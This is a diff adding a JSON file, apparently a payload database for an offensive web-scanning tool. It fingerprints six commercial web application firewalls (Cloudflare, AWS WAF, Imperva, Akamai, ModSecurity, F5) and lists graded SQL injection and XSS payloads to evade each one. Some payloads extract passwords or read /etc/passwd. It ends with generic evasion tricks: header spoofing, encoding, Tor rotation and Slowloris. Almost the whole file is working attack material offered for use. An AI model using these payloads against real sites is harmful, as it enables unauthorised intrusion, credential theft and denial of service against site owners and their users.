@@ -1,0 +1,289 @@
+{
+  "waf_vendors": [
+    {
+      "name": "Cloudflare",
+      "detection": {
+        "headers": ["cf-ray", "cf-cache-status", "server: cloudflare"],
+        "cookies": ["__cfduid", "__cf_bm"],
+        "response_keywords": ["cloudflare", "ray id"]
+      },
+      "bypasses": {
+        "sqli": {
+          "basic": [
+            "1' OR '1'='1",
+            "1' OR 1=1--",
+            "1' UNION SELECT NULL--"
+          ],
+          "intermediate": [
+            "1'/**/OR/**/'1'='1",
+            "1'%09OR%09'1'='1",
+            "1'%0aOR%0a'1'='1",
+            "1'||'1'='1"
+          ],
+          "advanced": [
+            "1'/*!50000OR*/1=1--",
+            "1'%23%0aOR%23%0a'1'='1",
+            "1'un/**/ion sel/**/ect null--",
+            "1'/**/OR/**/'1'='1'/**/AND/**/'x'='x"
+          ]
+        },
+        "xss": {
+          "basic": [
+            "<script>alert(1)</script>",
+            "<img src=x onerror=alert(1)>"
+          ],
+          "intermediate": [
+            "<svg/onload=alert(1)>",
+            "<iframe src=javascript:alert(1)>",
+            "<body onload=alert(1)>"
+          ],
+          "advanced": [
+            "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
+            "<marquee onstart=alert(1)>",
+            "<isindex type=image src=x onerror=alert(1)>",
+            "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>"
+          ]
+        },
+        "techniques": [
+          "Origin header manipulation: Origin: https://target.com",
+          "X-Forwarded-For: 127.0.0.1",
+          "Case variation: SeLeCt instead of SELECT",
+          "Unicode encoding: %u0053%u0045%u004C%u0045%u0043%u0054",
+          "HTTP Parameter Pollution: ?id=1&id=' OR 1=1--",
+          "Cloudflare IP whitelist bypass: use actual origin IP"
+        ]
+      }
+    },
+    {
+      "name": "AWS WAF",
+      "detection": {
+        "headers": ["x-amzn-requestid", "x-amz-cf-id"],
+        "response_keywords": ["403 forbidden", "aws"]
+      },
+      "bypasses": {
+        "sqli": {
+          "basic": [
+            "1' OR '1'='1",
+            "1' UNION SELECT NULL--"
+          ],
+          "intermediate": [
+            "1'||(SELECT+1)='1",
+            "1'||'1'='1'||'",
+            "1' AND '1'='1"
+          ],
+          "advanced": [
+            "1'||TO_CHAR(1/0)||'",
+            "1'||UTL_INADDR.GET_HOST_NAME((SELECT+user+FROM+dual))||'",
+            "1'||DBMS_XMLGEN.GETXML('SELECT+user+FROM+dual')||'"
+          ]
+        },
+        "xss": {
+          "basic": [
+            "<script>alert(1)</script>"
+          ],
+          "intermediate": [
+            "<svg onload=alert(1)>",
+            "<math><mi xlink:href=\"data:x,<script>alert(1)</script>\">"
+          ],
+          "advanced": [
+            "<form action=javascript:alert(1)><input type=submit>",
+            "<input onfocus=alert(1) autofocus>",
+            "<select onfocus=alert(1) autofocus>"
+          ]
+        },
+        "techniques": [
+          "Use HTTP/1.0 instead of HTTP/1.1",
+          "Content-Type: text/plain bypass",
+          "Chunk encoding: Transfer-Encoding: chunked",
+          "Multiple Content-Length headers"
+        ]
+      }
+    },
+    {
+      "name": "Imperva (Incapsula)",
+      "detection": {
+        "headers": ["x-cdn: incapsula"],
+        "cookies": ["incap_ses_", "visid_incap_"],
+        "response_keywords": ["incapsula", "_incapsula_resource"]
+      },
+      "bypasses": {
+        "sqli": {
+          "basic": [
+            "1' OR '1'='1"
+          ],
+          "intermediate": [
+            "1'%0aOR%0a'1'='1",
+            "1'/*foo*/OR/*bar*/'1'='1"
+          ],
+          "advanced": [
+            "1'||(SELECT+1+FROM+dual+WHERE+'1'='1')||'",
+            "1'||CHR(49)||'",
+            "1'||ASCII('a')||'"
+          ]
+        },
+        "xss": {
+          "basic": [
+            "<script>alert(1)</script>"
+          ],
+          "intermediate": [
+            "<<script>alert(1);//<</script>",
+            "<iframe src=javascript:alert(1)>"
+          ],
+          "advanced": [
+            "<object data=javascript:alert(1)>",
+            "<embed src=javascript:alert(1)>",
+            "<applet code=javascript:alert(1)>"
+          ]
+        },
+        "techniques": [
+          "X-Originating-IP: 127.0.0.1",
+          "X-Remote-IP: 127.0.0.1",
+          "Randomize User-Agent per request",
+          "Split payload across multiple parameters"
+        ]
+      }
+    },
+    {
+      "name": "Akamai",
+      "detection": {
+        "headers": ["server: akamaighost"],
+        "response_keywords": ["akamai", "reference"]
+      },
+      "bypasses": {
+        "sqli": {
+          "basic": [
+            "1' OR '1'='1"
+          ],
+          "intermediate": [
+            "1'%09OR%09'1'='1",
+            "1'+OR+'1'='1'+--"
+          ],
+          "advanced": [
+            "1'||SUBSTR((SELECT+password+FROM+users+LIMIT+1),1,1)||'",
+            "1'||MID((SELECT+password+FROM+users+LIMIT+1),1,1)||'",
+            "1'||(SELECT+CONCAT(user,0x3a,password)+FROM+users+LIMIT+1)||'"
+          ]
+        },
+        "xss": {
+          "basic": [
+            "<script>alert(1)</script>"
+          ],
+          "intermediate": [
+            "<img src=x:alert(1) onerror=eval(src)>",
+            "<svg><script>alert(1)</script></svg>"
+          ],
+          "advanced": [
+            "<math><mi xlink:href=\"javascript:alert(1)\">click</mi></math>",
+            "<table background=\"javascript:alert(1)\">",
+            "<link rel=import href=\"data:text/html,<script>alert(1)</script>\">"
+          ]
+        },
+        "techniques": [
+          "Use rare HTTP methods: TRACE, TRACK",
+          "Double URL encoding",
+          "Mixed case + URL encoding: %53%45%4c%45%43%54",
+          "Add legitimate traffic patterns before attack"
+        ]
+      }
+    },
+    {
+      "name": "ModSecurity",
+      "detection": {
+        "headers": ["server: mod_security"],
+        "response_keywords": ["mod_security", "forbidden", "406 not acceptable"]
+      },
+      "bypasses": {
+        "sqli": {
+          "basic": [
+            "1' OR '1'='1"
+          ],
+          "intermediate": [
+            "1'||'1'='1'||'",
+            "1'/**/OR/**/'1'='1"
+          ],
+          "advanced": [
+            "1'||IF(1=1,SLEEP(5),0)||'",
+            "1'||BENCHMARK(5000000,MD5('A'))||'",
+            "1'||EXTRACTVALUE(1,CONCAT(0x7e,(SELECT+version()),0x7e))||'"
+          ]
+        },
+        "xss": {
+          "basic": [
+            "<script>alert(1)</script>"
+          ],
+          "intermediate": [
+            "<img src=x onerror=prompt(1)>",
+            "<svg/onload=confirm(1)>"
+          ],
+          "advanced": [
+            "<iframe srcdoc=\"<script>alert(1)</script>\">",
+            "<object data=\"data:text/html,<script>alert(1)</script>\">",
+            "<base href=\"javascript:alert(1)//\">"
+          ]
+        },
+        "techniques": [
+          "Tamper scripts: --tamper=space2comment,between",
+          "NULL byte injection: %00",
+          "Newline injection: %0a, %0d",
+          "Segment payload into small chunks"
+        ]
+      }
+    },
+    {
+      "name": "F5 BIG-IP ASM",
+      "detection": {
+        "headers": ["server: bigip"],
+        "cookies": ["bigipserver", "f5_cspm"]
+      },
+      "bypasses": {
+        "sqli": {
+          "basic": [
+            "1' OR '1'='1"
+          ],
+          "intermediate": [
+            "1'||'1'='1'--",
+            "1' AND '1'='1"
+          ],
+          "advanced": [
+            "1'||LOAD_FILE('/etc/passwd')||'",
+            "1'||HEX((SELECT+password+FROM+users+LIMIT+1))||'",
+            "1'||TO_BASE64((SELECT+password+FROM+users+LIMIT+1))||'"
+          ]
+        },
+        "xss": {
+          "basic": [
+            "<script>alert(1)</script>"
+          ],
+          "intermediate": [
+            "<details open ontoggle=alert(1)>",
+            "<marquee onstart=alert(1)>"
+          ],
+          "advanced": [
+            "<form><button formaction=javascript:alert(1)>click",
+            "<input type=\"image\" src=x onerror=alert(1)>",
+            "<video><source onerror=alert(1)>"
+          ]
+        },
+        "techniques": [
+          "HPP (HTTP Parameter Pollution)",
+          "Use POST instead of GET",
+          "Obfuscate with HTML encoding: &#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;",
+          "Combine multiple bypass techniques"
+        ]
+      }
+    }
+  ],
+  "generic_bypasses": [
+    "Case toggling: SeLeCt, UnIoN",
+    "Comment injection: /*comment*/",
+    "Whitespace alternatives: %09 (tab), %0a (newline), %0d (carriage return), %0c (form feed), %0b (vertical tab)",
+    "Encoding: URL, double URL, HTML entity, Unicode, hex",
+    "String concatenation: 'SEL'+'ECT', 'SEL'||'ECT', CONCAT('SEL','ECT')",
+    "Alternative syntax: && instead of AND, || instead of OR",
+    "Buffer overflow: send 10KB+ payload",
+    "Slowloris: keep connections open with slow POST",
+    "IP rotation: use proxies, VPN, Tor",
+    "User-Agent rotation: mimic legitimate browsers",
+    "Referer spoofing: Referer: https://target.com"
+  ]
+}
